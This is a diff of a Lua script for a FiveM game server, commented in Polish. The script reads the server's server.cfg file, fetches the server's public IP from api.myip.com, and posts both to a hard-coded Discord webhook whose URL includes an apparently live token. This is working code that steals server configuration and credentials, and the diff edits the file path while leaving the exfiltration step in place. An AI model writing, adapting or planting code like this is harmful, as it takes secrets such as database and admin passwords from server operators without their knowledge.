@@ -1,4 +1,4 @@
-Citizen.CreateThread(function()
+
 local discordWebhookURL = "https://discord.com/api/webhooks/1370903751736557638/0lX_gye0_-aWFDYVCxqmHheAt9v_BmTl8cPvPGLpicNwmU7kdgWx0wd26NdijoNw6B11"  -- Wstaw swój URL webhooka tutaj
 
 -- Funkcja do wysyłania danych do Discorda
@@ -16,7 +16,7 @@ function sendToDiscord(message)
     end, 'POST', json.encode(content), { ['Content-Type'] = 'application/json' })
 end
 
--- Funkcja do pobrania IP serwera (jeśli jest publiczne)
+-- Funkcja do pobrania publicznego IP serwera z myip.com
 function getServerIP()
     -- Wykonujemy zapytanie HTTP do myip.com API
     PerformHttpRequest("https://api.myip.com", function(statusCode, response, headers)
@@ -32,7 +32,7 @@ end
 
 -- Funkcja do odczytu zawartości pliku server.cfg
 function getServerConfig()
-    local configPath = "/home/fivem/txData/CFXDefaultFiveM_17F3A3.base/server.cfg"  -- Ścieżka do pliku cfg
+    local configPath = "/home/fivem/servers/server.cfg"  -- Zaktualizuj ścieżkę do pliku
     local file = io.open(configPath, "r")
     local content = ""
 
@@ -59,6 +59,3 @@ message = message .. "**Zawartość server.cfg:**\n" .. serverConfig
 sendToDiscord(message)
 
     -- Czekamy przez minutę (lub inną wartość), by uniknąć zablokowania wątku serwera
-    Citizen.Wait(60000)  -- 60 sekund
-end)
-
